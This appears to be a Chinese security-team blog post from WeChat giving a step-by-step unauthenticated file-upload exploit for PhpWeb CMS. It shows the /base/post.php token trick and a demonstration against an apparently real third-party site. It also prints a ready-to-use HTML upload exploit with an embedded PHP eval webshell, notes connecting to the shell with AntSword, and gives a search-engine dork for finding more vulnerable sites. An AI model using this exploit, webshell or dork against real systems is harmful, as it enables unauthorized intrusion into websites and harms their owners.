> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MgXo3ViEtMCxSu0oNJE9xw)

![](https://mmbiz.qpic.cn/mmbiz_gif/Svw665Wd5NDQQJQgg90v32vEPPIrV29uj5ibicL4xfMqpCCVUXiaZUrXzFszjNfGPiakELlyhnGhkvHcIcula2SZlQ/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/Svw665Wd5NCM84Ora7UvtwLnkDGUBqfFFicL7Y9QMhLXyibwb3U2xXSibF5ZEV6D9wfibvXLWtrjZOfK74m6gtknGA/640?wx_fmt=png)

原创声明！该文章著作权所有归 宁夏骐跃信息科技有限公司 F1A4 安全团队~ 转载请注明！

  

开局一张图

![](https://mmbiz.qpic.cn/mmbiz/Svw665Wd5NDQQJQgg90v32vEPPIrV29u2949VyfoAcWJIoia2baejJDtSF4OXQw7FSg1g9Zf5Agcx9tFysNDCPA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Svw665Wd5NDQQJQgg90v32vEPPIrV29udmhF8wCJG6dRYmiaCT61VhacewGwyaRElcN8ENy9JicBzasK0LBZL5RA/640?wx_fmt=jpeg)

**陌安**

宁夏骐跃信息科技有限公司  

  

  

****一直要写文章，结果各种事情就一直影响。****

**今天拿一个很老很水的漏洞写篇文章，力求把每一个细节都写出来，让读者不需要再去百度其他大佬的文章了。**

  

****言**归正传，直接开始吧。**

**1.1 简述**

**PhpWeb CMS 是蛮早的一款企业建站的 CMS 了，所以漏洞也非常鸡肋。这个前台 Getshell 直接无限制上传文件。**

**1.2 利用**

**我们利用到目标的：/base/post.php  
**

 **/base/appfile.php**

**首先访问 / base/post.php ，post 数据 act=appcode。获取加密前的 md5 值（初始值），然后拿着这个 md5 密文继续 md5 加密，在这里需要注意的是在原密文后面需要加上‘a’（无引号，只有一个 a）。然后通过 / base/appfile.php 进行上传，最后木马的地址就是 effect/source/bg / 文件名**

**1.3 演示**

**目标站点：http://www.jnrx***ser.com/**

![](https://mmbiz.qpic.cn/mmbiz/Svw665Wd5NDQQJQgg90v32vEPPIrV29uVS4icTFptOQicflJy6AD7sb3nq6CHhSph5btbd9ic6T7uy4cBlEK3GPAg/640?wx_fmt=jpeg)

**访问 / base/post.php，并且 post 数据 act=appcode**

![](https://mmbiz.qpic.cn/mmbiz/Svw665Wd5NDQQJQgg90v32vEPPIrV29uQ0dnjKJ7U3baerF2CqlrREgEFibL4tPzwKAY6vnpqqSWCtwuFiabqCgw/640?wx_fmt=jpeg)

**拿去继续加密，记住原来字符串后面要加上 a 进行加密。**

![](https://mmbiz.qpic.cn/mmbiz/Svw665Wd5NDQQJQgg90v32vEPPIrV29uklME1LaBDXwZKcjsjWMqx5FHKDKsUFHtCkSonaGbWqFZdhJnnzccwQ/640?wx_fmt=jpeg)

**编写 Exp，Getshell。**

![](https://mmbiz.qpic.cn/mmbiz/Svw665Wd5NDQQJQgg90v32vEPPIrV29ujjDSEXe9GzAu3K5nBv5gpcVp2UQQ2lgDk3cOfepIP9L4efAceFxB6A/640?wx_fmt=jpeg)

**放出 EXP，修改配置好 EXP 就可以 Getshell 了。**

> **<html>**
> 
> **<!--**
> 
>  **请勿用于违法行为，后果自负。** 
> 
> **Powered By F1A4 安全 @陌安（f1a4.org）** 
> 
> **QQ 3315453754**
> 
> **-->** 
> 
> **<body>**
> 
>  **<center>** 
> 
> **<h1>PhpWeb CMS Getshell EXP<h1>** 
> 
> **<h3>F1A4 Security Team@Moann</h3>**
> 
>  **<h3>Blog:<a href="https://www.jianshu.com/u/b4a349a97249">Mo_An</a></h3>**
> 
>  **<form action="http:/test/base/appfile.php" method="post" enctype="multipart/form-data"><!--   a 不需要修改，upload 也不需要修改，将加密后的密文输入，选择上传的文件然后最后一个 size 输入上传文件大小。<?php @eval($_POST[pass]);?>，这个为 28.-->**
> 
> **<label for="file">Filename:</label>**
> 
>  **<input type="file" />** 
> 
> **<input type="text" />**
> 
>  **<input type="text" />**
> 
>  **<input type="text" />**
> 
>  **<input type="text" /><br />**
> 
>  **<input type="submit" />** 
> 
> **</form>**
> 
>  **</body>** 
> 
> **</html>**

**返回 OK 即成功上传，木马地址为 http://www.jnrx***ser.com/effect/source/bg/f1a4.org**

**蚁剑连接之。**

![](https://mmbiz.qpic.cn/mmbiz/Svw665Wd5NDQQJQgg90v32vEPPIrV29ukMaBGF7Rf7u3FkA0SLR6XDgEHJoI7YsliaicV06ZQChqPib2icyicpRMiaBA/640?wx_fmt=jpeg)

  

  

Getshell

**再送一个关键字：inurl:/product/class/**

  

![](https://mmbiz.qpic.cn/mmbiz_png/Svw665Wd5NCM84Ora7UvtwLnkDGUBqfFlmwHVYT7pvJw3WnUhLdAoCpx5wqgbsvjcQA7G80nmGyEJzQbtXnFyQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Svw665Wd5NCM84Ora7UvtwLnkDGUBqfFdkFq0GibXuEJLe6AtWSa3b7dpBeBhHLlgcqNdrRG7wL3MdqJKg4uHWw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/Svw665Wd5NCM84Ora7UvtwLnkDGUBqfFXwQGsOTzYV8MWTD2e5HJNYgoLrghpWCe7Bxzb00SbB3vicptzIFZYsg/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/Svw665Wd5NCM84Ora7UvtwLnkDGUBqfFheeHX9NSibvMZhTBjSSqq3aw31X5GibJwxtseuUA0ySNXFZB3yAv6B7g/640?wx_fmt=png)